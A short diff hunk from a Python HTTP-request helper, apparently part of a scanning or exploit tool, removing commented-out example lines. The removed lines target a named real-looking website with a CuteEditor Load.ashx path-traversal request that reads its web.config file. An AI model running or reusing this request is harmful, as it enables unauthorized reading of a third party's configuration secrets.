@@ -10,7 +10,3 @@ def send_http_request(url, verify=False, timeout=5, headers=None, proxy=None):
     except requests.exceptions.RequestException:
         return None
 
-# 示例用法
-#url = "https://funbox.com.tw/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
-#response = send_http_request(url)
-#print(response.text)
